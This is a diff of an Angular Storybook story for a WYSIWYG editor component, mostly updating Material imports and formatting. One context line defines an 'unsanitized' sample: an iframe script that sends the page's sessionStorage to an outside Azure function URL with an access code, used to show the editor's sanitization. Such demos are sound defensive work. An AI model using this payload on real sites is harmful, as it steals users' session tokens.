@@ -1,20 +1,24 @@
-import { Meta, Story } from '@storybook/angular/types-6-0';
-import { moduleMetadata } from '@storybook/angular';
-import { MatLegacyCardModule as MatCardModule } from '@angular/material/legacy-card';
-import { MatLegacyButtonModule as MatButtonModule } from '@angular/material/legacy-button';
 import { ReactiveFormsModule, UntypedFormControl } from '@angular/forms';
+import { MatButtonModule } from '@angular/material/button';
+import { MatCardModule } from '@angular/material/card';
 import { StoWysiwygModule, WysiwygComponent } from '@ngx-stoui/form';
+import { moduleMetadata } from '@storybook/angular';
+import { Meta, Story } from '@storybook/angular/types-6-0';
 
 export default {
   title: 'form/Wysiwyg',
   component: WysiwygComponent,
   decorators: [
     moduleMetadata({
-      imports: [ StoWysiwygModule, ReactiveFormsModule, MatCardModule, MatButtonModule ],
-    })
-  ]
+      imports: [
+        StoWysiwygModule,
+        ReactiveFormsModule,
+        MatCardModule,
+        MatButtonModule,
+      ],
+    }),
+  ],
 } as Meta;
-
 
 const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
 </iframe>
@@ -37,7 +41,7 @@ const Template: Story<WysiwygComponent> = (args) => {
 <p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in
 (and preferable on your backend service)</p>
 </div>
-`
+`,
   };
 };
 
